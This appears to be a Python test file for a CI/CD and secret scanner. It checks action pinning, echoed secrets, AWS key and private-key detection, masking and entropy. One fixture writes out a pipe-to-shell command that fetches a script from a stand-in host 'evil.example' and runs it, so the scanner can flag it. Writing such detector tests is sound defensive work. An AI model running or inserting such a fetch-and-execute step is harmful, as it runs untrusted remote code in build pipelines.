"""Tests for CI/CD and secret scanners (no live GitHub calls)."""

from app.services.cicd_scan import (
    action_is_pinned,
    analyze_github_actions_yaml,
    analyze_generic_ci_file,
)
from app.services.secret_scan import mask_secret, scan_text_for_secrets, shannon_entropy


def test_action_pinning():
    assert action_is_pinned("actions/checkout@8ade135a86ccc45941b6aa35fc3132d4aef3e5dd") is True
    assert action_is_pinned("actions/checkout@v4") is False
    assert action_is_pinned("./local-action") is True


def test_unpinned_action_flagged():
    content = """
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo hello
"""
    hits = analyze_github_actions_yaml(".github/workflows/ci.yml", content)
    assert any("Unpinned" in h.title for h in hits)


def test_pinned_action_not_flagged():
    content = """
name: CI
on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@8ade135a86ccc45941b6aa35fc3132d4aef3e5dd
"""
    hits = analyze_github_actions_yaml(".github/workflows/ci.yml", content)
    assert not any("Unpinned" in h.title for h in hits)


def test_curl_bash_flagged():
    content = "script:\n  - curl https://evil.example/install.sh | bash\n"
    hits = analyze_generic_ci_file(".gitlab-ci.yml", content)
    assert any("pipes remote script" in h.title for h in hits)


def test_echo_secret_flagged():
    content = """
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - run: echo "${{ secrets.AWS_KEY }}"
"""
    hits = analyze_github_actions_yaml(".github/workflows/bad.yml", content)
    assert any("Secret may be echoed" in h.title for h in hits)


def test_mask_secret_never_full():
    raw = "AKIAIOSFODNN7EXAMPLE"
    masked = mask_secret(raw)
    assert raw not in masked
    assert "…" in masked or "*" in masked


def test_aws_key_detected_and_masked():
    content = 'AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\n'
    hits = scan_text_for_secrets("config.py", content)
    assert any(h.rule_id == "aws_access_key" for h in hits)
    assert all("AKIAIOSFODNN7EXAMPLE" not in h.description for h in hits)


def test_private_key_header():
    content = "-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n"
    hits = scan_text_for_secrets("key.pem", content)
    assert any(h.rule_id == "private_key" for h in hits)


def test_placeholder_skipped():
    content = 'api_key = "YOUR_API_KEY_PLACEHOLDER_VALUE_HERE_XXXX"\n'
    hits = scan_text_for_secrets("app.py", content)
    # placeholder line should be skipped entirely
    assert hits == []


def test_entropy_helper():
    assert shannon_entropy("aaaaaaaa") < shannon_entropy("aB3$kL9mQ2xZ")
